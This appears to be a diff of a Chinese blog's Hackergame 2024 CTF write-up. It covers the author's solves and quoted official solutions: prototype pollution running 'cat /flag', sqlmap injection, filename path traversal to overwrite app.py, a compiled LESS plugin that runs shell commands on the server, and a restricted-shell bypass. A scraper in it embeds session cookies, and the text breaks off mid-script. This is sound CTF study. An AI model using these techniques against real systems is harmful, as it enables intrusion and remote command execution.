@@ -18,15 +18,15 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Hackergame作为中科大举办的CTF比赛，赛题都很有水平和研究价值（而且都很有梗），确实是一次玩的很开心的比赛（虽然做出来的题并不多） 挑出几道我做出来且觉得有记录价值的题来写一写 比大小王自从小猿口算火了之后，各大CTF都开始出类似的题了（我们CTFer真是不肯放过任何一个热梗呢） 所以用类似的思路 首先分析前端脚本，发现题目首先请求了&#x2F;game路由获取游戏数据，请求之后获取到游">
+        <meta name="description" content="个人WPHackergame作为中科大举办的CTF比赛，赛题都很有水平和研究价值（而且都很有梗），确实是一次玩的很开心的比赛（虽然做出来的题并不多） 挑出几道我做出来且觉得有记录价值的题来写一写 Web比大小王自从小猿口算火了之后，各大CTF都开始出类似的题了（我们CTFer真是不肯放过任何一个热梗呢） 所以用类似的思路 首先分析前端脚本，发现题目首先请求了&#x2F;game路由获取游戏数据，请">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hackergame 2024 个人复盘">
 <meta property="og:url" content="http://example.com/2024/11/09/Hackergame%202024%20%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/index.html">
 <meta property="og:site_name" content="Wang1r的博客">
-<meta property="og:description" content="Hackergame作为中科大举办的CTF比赛，赛题都很有水平和研究价值（而且都很有梗），确实是一次玩的很开心的比赛（虽然做出来的题并不多） 挑出几道我做出来且觉得有记录价值的题来写一写 比大小王自从小猿口算火了之后，各大CTF都开始出类似的题了（我们CTFer真是不肯放过任何一个热梗呢） 所以用类似的思路 首先分析前端脚本，发现题目首先请求了&#x2F;game路由获取游戏数据，请求之后获取到游">
+<meta property="og:description" content="个人WPHackergame作为中科大举办的CTF比赛，赛题都很有水平和研究价值（而且都很有梗），确实是一次玩的很开心的比赛（虽然做出来的题并不多） 挑出几道我做出来且觉得有记录价值的题来写一写 Web比大小王自从小猿口算火了之后，各大CTF都开始出类似的题了（我们CTFer真是不肯放过任何一个热梗呢） 所以用类似的思路 首先分析前端脚本，发现题目首先请求了&#x2F;game路由获取游戏数据，请">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-11-09T11:37:52.000Z">
-<meta property="article:modified_time" content="2024-11-09T12:32:02.322Z">
+<meta property="article:modified_time" content="2024-11-09T16:27:02.936Z">
 <meta property="article:author" content="Wang1rrr">
 <meta property="article:tag" content="CTF|WP">
 <meta name="twitter:card" content="summary">
@@ -266,8 +266,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-09 20:32:02</span>
-            <span class="mobile">2024-11-09 20:32:02</span>
+            <span class="desktop">2024-11-10 00:27:02</span>
+            <span class="mobile">2024-11-10 00:27:02</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -305,9 +305,9 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>Hackergame作为中科大举办的CTF比赛，赛题都很有水平和研究价值<del>（而且都很有梗）</del>，确实是一次玩的很开心的比赛<del>（虽然做出来的题并不多）</del></p>
+            <h1 id="个人WP"><a href="#个人WP" class="headerlink" title="个人WP"></a>个人WP</h1><p>Hackergame作为中科大举办的CTF比赛，赛题都很有水平和研究价值<del>（而且都很有梗）</del>，确实是一次玩的很开心的比赛<del>（虽然做出来的题并不多）</del></p>
 <p>挑出几道我做出来且觉得有记录价值的题来写一写</p>
-<h1 id="比大小王"><a href="#比大小王" class="headerlink" title="比大小王"></a>比大小王</h1><p>自从小猿口算火了之后，各大CTF都开始出类似的题了<del>（我们CTFer真是不肯放过任何一个热梗呢）</del></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比大小王"><a href="#比大小王" class="headerlink" title="比大小王"></a>比大小王</h3><p>自从小猿口算火了之后，各大CTF都开始出类似的题了<del>（我们CTFer真是不肯放过任何一个热梗呢）</del></p>
 <p>所以用类似的思路</p>
 <p>首先分析前端脚本，发现题目首先请求了&#x2F;game路由获取游戏数据，请求之后获取到游戏数据的json，发现是100个数字对</p>
 <p>在前端进行一段游戏，在控制台调用前端函数，拦截请求包可知发送数据是input[]</p>
@@ -321,14 +321,14 @@
 <p><code>sleep(5)</code></p>
 <p>再次请求，得到flag</p>
 <p><code>flag&#123;1-AM-Th3-H4CK3R-KIn9-of-c0mPAr!Ng-NUmBErS-2o24&#125;</code></p>
-<h1 id="Node-js-is-Web-Scale"><a href="#Node-js-is-Web-Scale" class="headerlink" title="Node.js is Web Scale"></a>Node.js is Web Scale</h1><p>该题是一个js题，但我对js其实并不熟悉，于是我请教<del>（真正的CTF领域大神）</del>chatGPT，得知可能是原型链污染，于是开始进行尝试</p>
+<h3 id="Node-js-is-Web-Scale"><a href="#Node-js-is-Web-Scale" class="headerlink" title="Node.js is Web Scale"></a>Node.js is Web Scale</h3><p>该题是一个js题，但我对js其实并不熟悉，于是我请教<del>（真正的CTF领域大神）</del>chatGPT，得知可能是原型链污染，于是开始进行尝试</p>
 <p>首先，发送一个 POST 请求到 <code>/set</code> 路由，将 <code>__proto__.getflag</code> 设置为一个有效的命令（例如 <code>cat /flag</code>）。这会导致所有对象都继承这个属性</p>
 <p>发送一个 GET 请求到 <code>/execute</code> 路由，使用 <code>getflag</code> 作为命令</p>
 <p>这样就能获取到flag了</p>
 <p><code>flag&#123;n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_d019f3a4d7&#125;</code></p>
 <p>平心而论，这道题的难度不大，但原型链污染是我第一次接触，还是很值得记录的</p>
 <p><del>（至于深入学习原理，当然是下次遇到再说啦）</del></p>
-<h1 id="PaoluGPT"><a href="#PaoluGPT" class="headerlink" title="PaoluGPT"></a>PaoluGPT</h1><p>首先，题目给了一个巨大的AI对话的数据集，第一题明显是要在其中寻找flag</p>
+<h3 id="PaoluGPT"><a href="#PaoluGPT" class="headerlink" title="PaoluGPT"></a>PaoluGPT</h3><p>首先，题目给了一个巨大的AI对话的数据集，第一题明显是要在其中寻找flag</p>
 <p>当然不可能自己找了，写出以下脚本</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;_ga&#x27;</span>: <span class="string">&#x27;GA1.1.85261473.1730723937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_ga_R7BPZT6779&#x27;</span>: <span class="string">&#x27;GS1.1.1730723937.1.1.1730723960.37.0.131545499&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJ0b2tlbiI6IjM5MTpNRVVDSVFDZmNCOHB1dy9oamh1aG05Mi9tNUw3em9YQUxEOXkwSTVVWVMxRDhMWEJiQUlnSllrSW02cE5lTEtGcU1jUnlrT1QrVitVTW9naUNWN2lWWjFkVWNTNTRwaz0ifQ.ZysYsQ.wH7PFBEqUspdD5WzuHSCWUqYdvg&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=.eJx1VNtOwkAU_BWzr25kz273RuIDF01Q0CiXgMYHRAREBAU0SPh328SkZ5rw1EzanTMzZ7Z7MRkuxqK8F-vN8GvTmWWAvFEh6GjDmQmJFN_D9-14LcqPe3GySR9OUng6yH-USNI5Ii9J5VBLnwMrXQ6MJAuInYoyYYxWGv6hhVfkQUnMkZdMJBlOGSUlcMyhAcc1E0zXwALmiLhvZoeIp0AwPLPAkIZoKWK2CQ9Q8SQCsECY5GBgAHsBIougGsPNaBQPjesMkJIC0tS9hUWAfSBVkGHGqnj2XI4Hw8T3ko04VpiEbwLTxVI4iAI7kSYT8SXmGzji0zVHWB8DFTG88qk76K4DRirotAA9DzeBbBkNsjg0C6VLlcHl0NyBO7asVCbfD2pWECaWFe-whl6pggMLLOrogtKBhh9ElgAeYBz-odixwg_EFDbEg4iFSxThHNCEzHuKxWY5H3-IsjCRyq2Lbq1xV3sdVcNq-1Oavk2300XUpYVt-t9lv9Ksx51q2O6gTfXQ7FefK43J1WDeWLjVzbh5ffnZGt3v5red095pt7WczGo9P-s90Et31LbJan4uDn_KWaM5.ZystiQ.cSllhsZPEFmQJamp9BWxJg66BUg&quot;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Cookie&#x27;: &#x27;_ga=GA1.1.85261473.1730723937; _ga_R7BPZT6779=GS1.1.1730723937.1.1.1730723960.37.0.131545499; session=eyJ0b2tlbiI6IjM5MTpNRVVDSVFDZmNCOHB1dy9oamh1aG05Mi9tNUw3em9YQUxEOXkwSTVVWVMxRDhMWEJiQUlnSllrSW02cE5lTEtGcU1jUnlrT1QrVitVTW9naUNWN2lWWjFkVWNTNTRwaz0ifQ.ZyjRtg.jpu-clgSoybGvNNkyUNdNDb9cRA&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://chal01-7ibwt9qy.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=40a7b8a8-80ea-4e79-b2af-3239281cfe20&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Chromium&quot;;v=&quot;130&quot;, &quot;Microsoft Edge&quot;;v=&quot;130&quot;, &quot;Not?A_Brand&quot;;v=&quot;99&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://chal01-88yesohp.hack-challenge.lug.ustc.edu.cn:8443/list&#x27;</span>, cookies=cookies, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到所有的链接</span></span><br><span class="line">links = soup.find_all(<span class="string">&#x27;a&#x27;</span>, href=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每个链接</span></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">    href = link[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> href.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">        <span class="comment"># 如果是相对路径，转换为绝对路径</span></span><br><span class="line">        href = <span class="string">&#x27;https://chal01-88yesohp.hack-challenge.lug.ustc.edu.cn:8443/&#x27;</span> + href</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取链接内容</span></span><br><span class="line">    link_response = requests.get(href,headers=headers,cookies=cookies)</span><br><span class="line">    link_content = link_response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 解码为字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找&quot;flag&quot;字符串</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&#x27;flag&#x27;</span>, link_content):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Found &quot;flag&quot; in link: <span class="subst">&#123;href&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 示例：打印链接内容</span></span><br></pre></td></tr></table></figure></div>
 
@@ -338,14 +338,126 @@
 <p>整体来说还是比较顺利的，用sqlmap就可以跑出来表名，列名</p>
 <p>然后进sql-shell查<code>SELECT * FROM messages WHERE shown=0;</code></p>
 <p>得到第二个flag</p>
-<h1 id="喜欢做签到的-CTFer-你们好呀"><a href="#喜欢做签到的-CTFer-你们好呀" class="headerlink" title="喜欢做签到的 CTFer 你们好呀"></a>喜欢做签到的 CTFer 你们好呀</h1><p>记录一下自己可能用到的非预期解<del>（应该可能大概是吧）</del></p>
+<h3 id="喜欢做签到的-CTFer-你们好呀"><a href="#喜欢做签到的-CTFer-你们好呀" class="headerlink" title="喜欢做签到的 CTFer 你们好呀"></a>喜欢做签到的 CTFer 你们好呀</h3><p>记录一下自己可能用到的非预期解<del>（应该可能大概是吧）</del></p>
 <p>进官网之后，进F12搜索flag，找到附近一个看起来像base64的字符串，直接解密，发现确实是，得到第一个flag</p>
 <p>分析第一个flag，发现用到了atob()，直接搜索，找到第二个调用的地方，果然有第二个flag</p>
 <p><del>（真是非预期吗？）</del></p>
 <p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;这里是分割线&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
-<p>其实复盘下来并没做出几道题，但做的还是很开心的，特别是做出来时的成就感，<del>比geekgame强</del></p>
+<h1 id="赛后感想"><a href="#赛后感想" class="headerlink" title="赛后感想"></a>赛后感想</h1><p>其实复盘下来并没做出几道题，但做的还是很开心的，特别是做出来时的成就感，<del>比geekgame强</del></p>
 <p>本来以为hackergame难度会对标geekgame，没想到其实还好，<del>适合我这种新手做</del></p>
 <p>希望下回还能参加</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;这里是分割线&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h1 id="WP学习与复现"><a href="#WP学习与复现" class="headerlink" title="WP学习与复现"></a>WP学习与复现</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="禁止内卷"><a href="#禁止内卷" class="headerlink" title="禁止内卷"></a>禁止内卷</h3><blockquote>
+<p>官方题解：</p>
+<p>本题事实上是由真实案例改编的，当然当时用的不是平方差，数据集也没这么离谱（</p>
+<p>看过 <a class="link"   target="_blank" rel="noopener" href="https://flask.palletsprojects.com/en/stable/patterns/fileuploads/" >Flask 文档 “Uploading Files” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的同学应该知道，有一个重要的函数 <code>secure_filename()</code>，用来处理用户提供的文件名：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; secure_filename(&quot;My cool movie.mov&quot;)</span><br><span class="line">&#x27;My_cool_movie.mov&#x27;</span><br><span class="line">&gt;&gt; secure_filename(&quot;../../../etc/passwd&quot;)</span><br><span class="line">&#x27;etc_passwd&#x27;</span><br><span class="line">&gt;&gt; secure_filename(&#x27;i contain cool \xfcml\xe4uts.txt&#x27;)</span><br><span class="line">&#x27;i_contain_cool_umlauts.txt&#x27;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>但是题目代码没有做这样的处理。从浏览器的 devtools 可以注意到，在上传文件的时候，HTTP 请求长这样：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /submit HTTP/1.1</span><br><span class="line">Host: chal02-y6bf22ju.hack-challenge.lug.ustc.edu.cn:8443</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,zh-CN;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------315661599216369553353790654512</span><br><span class="line">Content-Length: 253</span><br><span class="line">Origin: https://chal02-y6bf22ju.hack-challenge.lug.ustc.edu.cn:8443</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: https://chal02-y6bf22ju.hack-challenge.lug.ustc.edu.cn:8443/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-GPC: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">-----------------------------315661599216369553353790654512</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;hostname&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">hostname.example.com</span><br><span class="line"></span><br><span class="line">-----------------------------315661599216369553353790654512--</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>Body 里的 <code>filename</code> 就对应的代码中的 <code>file.filename</code>，虽然是「文件名」，但是没有什么东西在阻止你往这个文件名里面加别的字符，比如说 <code>/</code> 和 <code>.</code>。如果 <code>filename</code> 是 <code>../../../../../tmp/a</code>，那么 <code>os.path.join</code> 和 <code>file.save</code> 都不会做任何处理，导致路径穿越漏洞。</p>
+<p>然后接下来我们需要确定要写什么文件，写到哪里。根据题目提示，一个非常直觉的做法就是覆盖掉这段 Python 代码的文件。根据 <a class="link"   target="_blank" rel="noopener" href="https://flask.palletsprojects.com/en/stable/cli/" >Flask “Command Line Interface” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的文档可以知道：</p>
+<blockquote>
+<p>While –app supports a variety of options for specifying your application, most use cases should be simple. Here are the typical values:</p>
+<p>(nothing)</p>
+<p>The name “app” or “wsgi” is imported (as a “.py” file, or package), automatically detecting an app (app or application) or factory (create_app or make_app).</p>
+</blockquote>
+<p>可以尝试下面几种选项：</p>
+<ul>
+<li><code>/tmp/web/app.py</code>（题目的实际文件位置）</li>
+<li><code>/tmp/web/wsgi.py</code></li>
+<li><code>/tmp/web/app/__init__.py</code></li>
+<li><code>/tmp/web/wsgi/__init__.py</code></li>
+</ul>
+<p>最后一步是要发修改后的请求。Burp Suite 可以轻松实现，如果没有的话也没事，Firefox 开发者工具也支持修改并重放包。不过如果用后者的话，Firefox 似乎无法在重放时正确处理文件中的中文字符（原因不明），因此需要手动把中文字符删掉。</p>
+<p>我没有找到用 curl 修改文件名的方法，如果有知道的话欢迎在自己的 writeup 中写出。</p>
+</blockquote>
+<p>我当时做题时考虑过文件上传漏洞，毕竟代码没对文件做过多过滤，但我确实完全不了解以上提到的知识，遂不得已放弃。</p>
+<p>按照以上思路复现了一遍，确实好神奇啊。</p>
+<p>别人为什么都能一眼看出来(╯︵╰,)</p>
+<h3 id="LESS-文件查看器在线版"><a href="#LESS-文件查看器在线版" class="headerlink" title="LESS 文件查看器在线版"></a>LESS 文件查看器在线版</h3><blockquote>
+<p>官方题解：执行以下命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;#include &lt;stdlib.h&gt;\nvoid onload(void *v) &#123; system(&quot;ls / -alh&quot;); &#125;&#x27; | \</span><br><span class="line">  gcc -fPIC -shared -o plugin.so -xc -</span><br><span class="line">ar rc ./@.a /dev/null</span><br><span class="line">echo &#x27;-s --plugin ./plugin.so ./@.a&#x27; &gt; .a</span><br></pre></td></tr></table></figure></div>
+
+<p>然后把生成的 <code>plugin.so</code>、<code>.a</code>、<code>@.a</code> 三个文件上传即可在服务器上执行列目录的命令。这里要注意，上传时选择的文件的顺序很重要，一定要保证 <code>@.a</code> 是最后一个。在我的 macOS 的 Chrome 浏览器上面，按照文件大小排序就能保证上传的顺序，其他操作系统我没测试，但是总是可以通过 curl 之类的命令或者写脚本来保证上传顺序。</p>
+<p>最后把上面的命令替换成 <code>cat /flag</code>，重新上传一次，就可以得到 flag。</p>
+</blockquote>
+<p>我当时看到是在线less，还以为是与linux提权类似的流程，看来是我天真了。</p>
+<p>题解看了也没懂…….</p>
+<p>看到出题思路，感觉大家都好有钻研精神，而我连去查一查都没有……</p>
+<p>这就是差距吧(╥ω╥)</p>
+<h2 id="general"><a href="#general" class="headerlink" title="general"></a>general</h2><h3 id="不宽的宽字符"><a href="#不宽的宽字符" class="headerlink" title="不宽的宽字符"></a>不宽的宽字符</h3><blockquote>
+<p>官方题解：<br>字符串是 <code>NULL</code> 结尾 (zero-terminated) 的，如果在字符串的中间加入一个 <code>\0</code>，就可以在<strong>字符串层面</strong>丢弃后面的内容。</p>
+<p>我们想要构造前两个字符 <code>th</code> 对应的输入，那么就去找到 t 和 h 的 <a class="link"   target="_blank" rel="noopener" href="https://www.ascii-code.com/" >ASCII 代码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，分别是 <code>0x74</code> 和 <code>0x68</code>，然后根据上面的讨论，需要构造的宽字符就是 <code>0x6874</code>，去 <a class="link"   target="_blank" rel="noopener" href="https://symbl.cc/en/unicode-table/" >Unicode 代码表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上找到这个字符，即 <code>桴</code>。就这样一步一步地转化，可以得到我们的 payload，即 <code>桴晥慬g</code>。</p>
+</blockquote>
+<p>将宽字符转化为窄字符的过程中，将Unicode转化为ASCII码就可以得到结果，与官方题解类似地，如果想要构造Z:\theflag，只需要构造<code>Z:/theflag 0</code> <code>㩚琯敨汦条Ā</code></p>
+<p>确实是完全没接触过的知识<del>（杂项真杂啊）</del></p>
+<h3 id="PowerfulShell"><a href="#PowerfulShell" class="headerlink" title="PowerfulShell"></a>PowerfulShell</h3><blockquote>
+<p>官方题解：</p>
+<p><code>~</code> 会被扩展为 <code>$HOME</code> 变量即家目录，所以我们可以将 <code>~</code> 赋值给符合 bash 命名规则（<code>[_|a-z|A-Z]*</code>）的变量，从而任意使用这 8 个字符。</p>
+<p><code>/players</code> 可以拼凑出很多常见命令比如 <code>ls</code>、<code>ps</code>，参考 <a class="link"   target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html" >Shell Parameter Expansion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我们只需要使用 <code>$&#123;parameter:offset:length&#125;</code> 的形式就可以拼接字符串任意位置的字符，虽然 PowerfulShell 禁止使用字符 <code>0</code>，看似不能获取首位字符，但继续阅读文档可知这一限制是可以绕过的：\</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ string=01234567890abcdefgh</span><br><span class="line">$ echo $&#123;string: -7:2&#125;</span><br><span class="line">bc</span><br></pre></td></tr></table></figure></div>
+
+<p>单依靠家目录的 8 个字符不足以解决本题，检索 <a class="link"   target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/shell-script-to-demonstrate-special-parameters-with-example/" >shell special variable <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 可找到不包含字母的特殊变量 <code>$_</code>, <code>$$</code>, <code>$-</code>, <code>$_</code> 等。设计 PowerfulShell 时笔者将 get shell 所需最简单的两个字符 <code>s</code> 和 <code>h</code> 分别分到了家目录和 <code>$-</code>，其中 <code>$-</code> 算是一个隐藏前置条件，读者可以自行分析 <code>$-</code> 变量的意义。到了这一步已经具备完成本题的全部条件，但不排除选手解题过程中有其他思路。</p>
+</blockquote>
+<p>这个题抽象到，就算我已经看了题解，依旧没法想明白这是如何实现的</p>
+<p>暂且留下一些其他选手的WP，等日后再回顾吧</p>
+<blockquote>
+<p>huige233:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span 